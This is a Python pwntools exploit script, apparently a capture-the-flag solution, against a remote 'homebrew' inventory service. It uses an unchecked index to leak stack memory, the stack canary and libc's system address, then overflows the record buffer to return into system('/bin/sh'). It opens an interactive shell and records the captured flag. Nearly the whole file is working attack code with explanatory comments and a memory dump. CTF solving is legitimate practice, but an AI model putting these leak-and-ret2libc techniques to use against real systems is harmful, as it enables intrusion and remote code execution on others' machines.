#!/usr/bin/env python

from pwn import *

'''
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL
'''

# it will just use the index of input without check 
# choice 3 with a no-checked index will leak data
# choice 1 to write data 
# choice 1 make a overflow   fget will have same buffer and use it every time without initialize 

"""
--- in process_choice ---
char s; // [sp+30h] [bp-18h]@1         
int canary; // [sp+3Ch] [bp-Ch]@1

--- choice  add record ---
if ( input == 1 )
{
     printf("Enter product ID: ");
     fgets(&s, 12, stdin);                                       # get input to buffer s
     v3 = 12 * *(_DWORD *)summ + a1;                             
     *(_DWORD *)(v3 + 8) = strtoul(&s, 0, 10);
     printf("Enter product code: ");
     fgets(&s, 12, stdin);
     v8 = strchr(&s, '\n');
     if ( v8 )
       *v8 = 0;
     strncpy((char *)(12 * (*(_DWORD *)summ)++ + a1), &s, 8u);   # here will cause overflow with the summ incresed and no initial with buffer a1
                                                                 # a1 is the place which p_code and p_id start to save and locate at canary - 0x44
								 # every time add will strcpy 8 bytes plus a id with 4 bytes
								 # format : {p_code}(8){p_id}(4)
}

--- memory layout ---
x/40wx 0xffffcf90
(fgets's buffer)						(canary)
0xffffcf90:	0x000a342d	0x08048d18	0xffffcfb4	0x88c51300
0xffffcfa0:	0xf7fba000	0x00000000	0xffffd028	0x08048aeb
                (data buf add)
0xffffcfb0:	0xffffcfd8	0x0804a048	0x0000003c	0xf7fba000
0xffffcfc0:	0xffffcffe	0xffffcfff	0xffffd0c4	0x00000001
                                                (data buf start)
0xffffcfd0:	0xffffcfff	0xffffcffe      0x00000031	0x00000000
0xffffcfe0:	0x00000001	0x00000031	0x00000000	0x00000001
0xffffcff0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd000:	0x00000000	0x00000000	0x00000000	0x00000000
								(canary)
0xffffd010:	0x00000000	0x00008000	0x08048b3b	0x88c51300
								(return add)
0xffffd020:	0x08048b30	0x00000000	0x00000000	0xf7e27af3
"""

r = remote('172.16.101.57',12024)

#homebrew = ELF('./homebrew')
#r = process('./homebrew')

#a = raw_input('Go >')

def add_record(p_id, p_code):
	r.sendlineafter('Choose: ', '1')
	r.sendlineafter('ID: ', p_id)
	r.sendlineafter('code: ', p_code)

def view_record(idx):
	r.sendlineafter('Choose: ', '3')
	r.sendlineafter('view: ', str(idx))
	res = r.recvuntil('records in the IMS')
	
	p_id = res.split(',')[0].split(' ')[-1]
	p_id = p32(int(p_id)&0xffffffff)
	#print p_id.encode('hex')

        p_code = res.split('There')[0].split(' ')[-1]
	p_code = p_code.ljust(8, '\x00')
	#print '\\x'.join([p_code.encode('hex')[i:i+2] for i in range(0,len(p_code.encode('hex')),2)])
	data = p_code + p_id
	#print data.encode('hex')
	return data


initdata = view_record(-4)
add_Add_buf = u32(initdata[-4:])
add_for_check = u32(initdata[-8:-4])

print 'Address of add buffer :', hex(add_Add_buf)
print 'Address for check :', hex(add_for_check)

def leakdata(addr):
	offset = addr - add_Add_buf 
	idx = offset / 12 
	pos = offset % 12
	data = view_record(idx)
	return data[pos:]

canary = u32(leakdata(add_Add_buf + 0x44 )[:4])

print 'canary :', hex(canary) 
	
d = DynELF(leakdata, add_for_check ) 

print '-'
print 'libc_base :',d.lookup(None,'libc')
add_sys = d.lookup('system', 'libc')
print 'add_sys :',hex(add_sys)
print '--'

add_record('0','0')
add_record('0','0')
add_record('0','0')
add_record('0','0')
add_record('0','0')
add_record(str(canary),'0') # index 5'ID = canary
add_record('0',p32(0x080484ba))

# !!important  you must put /bin/sh more later
# i use add_Add_buf first and waste much time to find why it cant work 
# than after i trace into system i saw that the add_Add_buf has been used by system and the string "/bin/sh" is being destroy 
add_record(str(add_Add_buf+8*12),p32(add_sys)) # index 7'ID=parameter code=return_add
add_record('0','/bin/sh')

r.sendlineafter('Choose: ', '4')

r.interactive()


# AD{h0M3_8R3W3d_L18C_FR35h_anD_D3L1c10u2}
